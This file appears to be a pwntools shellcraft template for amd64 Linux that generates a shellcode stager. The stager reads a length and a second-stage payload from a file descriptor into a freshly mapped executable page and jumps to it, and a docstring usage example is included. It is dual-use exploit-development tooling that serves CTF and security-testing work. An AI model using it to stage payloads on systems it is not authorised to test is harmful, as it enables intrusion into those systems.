<%
from pwnlib.shellcraft.amd64 import push
from pwnlib.shellcraft.amd64.linux import read, readn, mmap
from pwnlib import constants as C
%>
<%page args="fd=0, length=None"/>
<%docstring>
Migrates shellcode to a new buffer.

Arguments:
    fd(int):
        Integer file descriptor to recv data from.
        Default is stdin (0).
    length(int):
        Optional buffer length.  If None, the first pointer-width
        of data received is the length.

Example:

    >>> p = run_assembly(shellcraft.stage())
    >>> sc = asm(shellcraft.echo("Hello\n", constants.STDOUT_FILENO))
    >>> p.pack(len(sc))
    >>> p.send(sc)
    >>> p.recvline()
    'Hello\n'
</%docstring>
<%
    protection = C.PROT_READ | C.PROT_WRITE | C.PROT_EXEC
    flags      = C.MAP_ANONYMOUS | C.MAP_PRIVATE

    assert isinstance(fd, int)
%>
%if length is None:
    /* How many bytes should we receive? */
    ${read(fd, 'rsp', 8)}
    pop  rax
    push rax /* Save exact size */
%else:
    ${push(length)}
%endif

    /* Page-align, assume <4GB */
    shr  eax, 12
    inc  eax
    shl  eax, 12

    /* Map it */
    ${mmap(0, 'rax', protection, flags, 0, 0)}

    /* Grab the saved size, save the address */
    pop  rbx
    push rax

    /* Read in all of the data */
    ${readn(fd, 'rax', 'rbx')}

    /* Go to shellcode */
    ret
